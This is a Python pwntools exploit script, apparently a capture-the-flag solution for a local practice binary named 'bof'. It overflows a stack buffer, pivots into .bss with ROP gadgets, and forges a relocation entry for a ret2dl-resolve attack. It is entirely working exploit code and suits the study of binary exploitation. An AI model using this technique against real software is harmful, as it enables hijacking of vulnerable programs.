#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./bof")
elf = ELF("./bof")

offset = 112
base = elf.bss() + 0x500
p3ret = 0x08048629
pebp = 0x0804862b
lret = 0x08048445
'''
0x08048629: pop esi; pop edi; pop ebp; ret;
0x0804862b: pop ebp; ret;
0x08048445: leave; ret;
'''
payload = 'a' * offset 
payload += p32(elf.plt['read'])
payload += p32(p3ret)
payload += p32(0)
payload += p32(base)
payload += p32(0x100)
payload += p32(pebp)
payload += p32(base)
payload += p32(lret)

io.send(payload)

plt0 = 0x8048370
relplt = 0x8048324
reloc_offset = base + 28 - relplt
#  print reloc_offset
write_r_info = 0x00000607
write_got = 0x0804a01c
cmd = "/bin/sh\0"

payload = 'aaaa'
payload += p32(plt0)
payload += p32(reloc_offset)
payload += 'aaaa'
payload += p32(1)
payload += p32(base + 0x80)
payload += p32(len(cmd))
payload += p32(write_got)
payload += p32(write_r_info)
payload = payload.ljust(0x80, 'a')
payload += cmd
payload = payload.ljust(0x100, 'a')

io.send(payload)

io.interactive()
io.close()

